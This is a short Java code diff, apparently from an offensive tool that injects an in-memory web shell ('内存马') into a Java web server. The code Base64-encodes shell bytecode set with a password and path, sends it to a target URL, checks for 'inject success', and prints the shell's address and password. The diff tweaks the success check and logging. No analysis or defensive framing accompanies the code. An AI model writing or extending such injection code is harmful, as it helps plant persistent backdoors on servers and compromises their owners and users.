@@ -384,7 +384,7 @@ public class Controller {
                 //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
                 //反射设置密码，取shell
                 String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
-                System.out.println(shellData);
+                //System.out.println(shellData);
                 params.put("c1",shellData );
                 //postData = "c1="+paramsContext.get("PageContext")+"&c2="+shellData;
             }
@@ -409,11 +409,10 @@ public class Controller {
             Response response = HttpTool.get1(url);
             //String data = response.getData();
             String header1 = response.getHeader().toString();
-            //请求头包含inject：ok表示成功
-            if (header1.contains("inject")) {
+            if (ss.contains("inject success")) {
                 logUtil.printSucceedLog("内存马注入成功！");
-                logUtil.printSucceedLog("连接地址:"+url);
-                logUtil.printSucceedLog("shell密码:"+passwd);
+                logUtil.printSucceedLog("连接地址:  "+url+path1);
+                logUtil.printSucceedLog("shell密码:  "+passwd);
             }else {
                 logUtil.printAbortedLog("内存马注入失败！",true);
                 logUtil.printData(header1);
